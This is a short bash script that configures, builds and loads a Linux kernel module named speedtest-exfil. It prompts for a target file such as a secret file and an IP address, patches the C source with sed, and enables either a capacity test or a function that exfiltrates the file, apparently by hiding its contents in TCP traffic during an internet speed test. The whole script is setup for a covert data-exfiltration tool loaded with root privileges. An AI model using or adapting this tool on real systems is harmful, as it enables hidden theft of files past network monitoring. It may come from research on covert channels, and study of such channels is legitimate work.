#!/bin/bash

echo "=== Speedtest Exfil Setup ==="

# Get user input
read -p "Enter TEST_FILE path (e.g. /home/user/secret.txt): " test_file
read -p "Enter SOURCE_IP (e.g. 192.168.1.10): " source_ip

# Modify constants in C file
sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" speedtest-exfil.c
sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-exfil.c

# Function selection
echo ""
echo "Select function to run:"
echo "1) max_bytes_exfiled() - calculate max exfiltration capacity"
echo "2) exfil_file()        - exfiltrate a file"
read -p "Enter 1 or 2: " choice

if [ "$choice" == "1" ]; then
    sed -i "s|        exfil_file(skb, tcp_payloadoffset);|        //exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
    sed -i "s|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
elif [ "$choice" == "2" ]; then
    sed -i "s|        //exfil_file(skb, tcp_payloadoffset);|        exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
    sed -i "s|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
else
    echo "Invalid choice. Exiting."
    exit 1
fi

# Build and load
echo ""
echo "Building..."
make

echo "Loading LKM..."
sudo insmod speedtest-exfil.ko

echo ""
echo "Done! Run your Speedtest now."
echo "When finished, run: sudo rmmod speedtest-exfil.ko && make clean"